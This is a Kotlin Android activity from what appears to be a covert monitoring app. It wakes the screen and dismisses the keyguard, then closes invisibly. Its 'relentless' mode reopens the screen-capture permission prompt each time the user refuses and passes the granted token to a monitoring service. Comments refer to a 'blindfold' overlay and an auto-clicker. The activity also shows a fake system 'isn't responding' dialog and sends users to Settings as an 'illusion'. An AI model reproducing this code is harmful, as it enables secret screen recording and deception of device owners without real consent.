package com.example.myandroid

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.provider.Settings

class PulseActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val preserveKeyguard = intent.getBooleanExtra("preserve_keyguard", false)
        val isWakeTrigger = intent.getBooleanExtra("is_wake_trigger", false)

        if (isWakeTrigger) {
            DebugLogger.log("PULSE_LIFECYCLE", "PulseActivity onCreate. preserveKeyguard=$preserveKeyguard")
            try {
                val km = getSystemService(android.content.Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                DebugLogger.log("PULSE_LIFECYCLE", "Pre-flag state -> Keyguard Locked: ${km.isKeyguardLocked}")
            } catch(e: Exception) {}
        }

        // 1. Force Screen Ignition
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O_MR1) {
            setTurnScreenOn(true)
            setShowWhenLocked(true) // ALWAYS show over lock screen to prevent OS auto-dismissal
        }
        
        var flags = android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                    android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    android.view.WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON

        // 1.5. Bypass Insecure Keyguard (Swipe to Unlock) ONLY if not preserving
        if (!preserveKeyguard) {
            flags = flags or android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            try {
                val km = getSystemService(android.content.Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    km.requestDismissKeyguard(this, null)
                } 
            } catch (e: Exception) { }
        }
        window.addFlags(flags)

        // 2. Log the pulse
        val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
        prefs.edit().putLong("last_pulse_time", System.currentTimeMillis()).apply()

        // 3. Short-lived termination logic
        if (isWakeTrigger) {
             val delayTime = if (preserveKeyguard) 100L else 2000L
             DebugLogger.log("PULSE_LIFECYCLE", "PulseActivity launched with is_wake_trigger=true. Waiting ${delayTime}ms...")
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ 
                 if (!isFinishing) {
                    try {
                        val km = getSystemService(android.content.Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                        DebugLogger.log("PULSE_LIFECYCLE", "Pre-finish state -> Keyguard Locked: ${km.isKeyguardLocked}")
                    } catch(e: Exception) {}
                    
                    DebugLogger.log("PULSE_LIFECYCLE", "${delayTime}ms elapsed. Finishing PulseActivity.")
                    finish()
                    overridePendingTransition(0, 0)
                 }
             }, delayTime)
             return
        }

        // 3.5 Relentless Screen Capture Engine
        if (intent.getBooleanExtra("is_screen_record_trigger", false)) {
            val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), 999)
            return // Halt normal termination logic until result is received
        }

        // 4. Engagement Protocol Redirect
        if (intent.getBooleanExtra("is_engagement_trigger", false)) {
            EngagementTracker.recordEvent(this, "MIRROR_CLICK")
            val originalPkg = intent.getStringExtra("original_pkg")
            val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
            val now = System.currentTimeMillis()
            prefs.edit()
                .putLong("last_engagement_success", now)
                .putString("engage_status", "SUCCESS: ${java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.US).format(java.util.Date(now))}")
                .apply()
            
            DebugLogger.log("ENGAGE_EVENT", "PHASE 2: SUCCESS. User tapped mirror. OS priority refreshed for $originalPkg context.")
            
            try {
                val launchIntent = packageManager.getLaunchIntentForPackage(originalPkg ?: "com.google.android.apps.messaging")
                if (launchIntent != null) {
                    startActivity(launchIntent)
                }
            } catch (e: Exception) {
                // Fallback to general SMS view if pkg launch fails
                val smsIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
                smsIntent.addCategory(android.content.Intent.CATEGORY_APP_MESSAGING)
                startActivity(smsIntent)
            }
            finish()
            return
        }
        
        // The Illusion: Route the user to a legitimate system screen
        if (intent.getBooleanExtra("route_to_settings", false)) {
            try {
                // 1. Try Samsung Digital Wellbeing first
                val samWellbeing = Intent().apply {
                    setClassName("com.samsung.android.forest", "com.samsung.android.forest.launcher.LauncherActivity")
                }
                if (samWellbeing.resolveActivity(packageManager) != null) {
                    samWellbeing.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(samWellbeing)
                } else {
                    // 2. Try AOSP Digital Wellbeing
                    val wellbeingIntent = Intent("com.google.android.apps.wellbeing.action.APP_USAGE_DASHBOARD")
                    if (wellbeingIntent.resolveActivity(packageManager) != null) {
                        wellbeingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        startActivity(wellbeingIntent)
                    } else {
                        // 3. Fallback to standard settings
                        val settingsIntent = Intent(Settings.ACTION_SETTINGS)
                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        startActivity(settingsIntent)
                    }
                }
            } catch (e: Exception) {
                // Absolute safety fallback
                startActivity(Intent(Settings.ACTION_SETTINGS).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            }
            finish()
            return
        }

        // 4.5 Native ANR Illusion
        if (intent.getBooleanExtra("is_anr_trigger", false)) {
            val appName = intent.getStringExtra("anr_app_name") ?: "This app"
            
            // Detect system theme
            val isDark = (resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK) == 
                         android.content.res.Configuration.UI_MODE_NIGHT_YES
            
            val style = if (isDark) android.R.style.Theme_DeviceDefault_Dialog_Alert 
                        else android.R.style.Theme_DeviceDefault_Light_Dialog_Alert

            DebugLogger.log("MOCK_ANR", "Lifecycle: Preparing to show native ANR dialog for '$appName'")

            val dialog = android.app.AlertDialog.Builder(this, style)
                .setTitle("$appName isn't responding")
                .setMessage("$appName isn't responding.\nDo you want to close it?")
                .setPositiveButton("Close app") { _, _ -> 
                    DebugLogger.log("MOCK_ANR", "Action: User tapped 'Close app'")
                    finish() 
                }
                .setNegativeButton("Wait") { _, _ -> 
                    DebugLogger.log("MOCK_ANR", "Action: User tapped 'Wait'")
                    finish() 
                }
                .setCancelable(false)
                .create()
                
            dialog.setOnDismissListener { 
                DebugLogger.log("MOCK_ANR", "Lifecycle: Dialog dismissed. Terminating illusion.")
                finish()
                overridePendingTransition(0, 0)
            }
            dialog.show()
            DebugLogger.log("MOCK_ANR", "Lifecycle: Dialog successfully rendered and presented to user.")
            return
        }

        // Immediately close our invisible activity. 
        // overridePendingTransition(0, 0) prevents any visual screen-flash.
        finish()
        overridePendingTransition(0, 0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 999) {
            if (resultCode == RESULT_OK && data != null) {
                DebugLogger.log("SCREEN_REC", "Token captured. Passing to MonitorService...")
                val i = Intent(this, MonitorService::class.java).apply {
                    action = "ACTION_START_RECORDING"
                    putExtra("resultCode", resultCode)
                    putExtra("data", data)
                }
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i)
                } else {
                    startService(i)
                }
            } else {
                DebugLogger.log("SCREEN_REC", "Permission denied by user.")
                if (ScreenRecordManager.expectedMode == "RELENTLESS") {
                    DebugLogger.log("SCREEN_REC", "RELENTLESS MODE: Respawning capture prompt instantly.")
                    val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                    startActivityForResult(mpm.createScreenCaptureIntent(), 999)
                    return
                }
            }
            // Remove blindfold in case the auto-clicker failed or was skipped
            if (ScreenRecordManager.expectedMode == "AUTO") {
                DimmerManager.removeOverlay(this)
                ScreenRecordManager.expectedMode = "" 
            }
            finish()
            overridePendingTransition(0, 0)
        }
    }
}